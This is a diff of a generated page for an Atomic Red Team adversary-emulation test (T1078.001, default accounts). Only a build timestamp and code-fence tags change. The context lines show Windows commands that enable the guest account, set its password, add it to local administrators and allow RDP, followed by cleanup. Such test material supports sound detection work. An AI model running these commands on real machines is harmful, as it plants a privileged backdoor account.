@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1078.001"
 attack_technique_name: "Valid Accounts: Default Accounts"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "99747561-ed8d-47f2-9c91-1e5fde1ed6e0"
@@ -77,7 +77,7 @@ and desktop will allow multiple RDP connections.
 
 ### Command
 
-```commandprompt
+```cmd
 net user #{guest_user} /active:yes
 net user #{guest_user} #{guest_password}
 net localgroup #{local_admin_group} #{guest_user} /add
@@ -88,7 +88,7 @@ reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConne
 
 ### Cleanup
 
-```commandprompt
+```cmd
 net user #{guest_user} /active:no >nul 2>&1
 net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
 net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
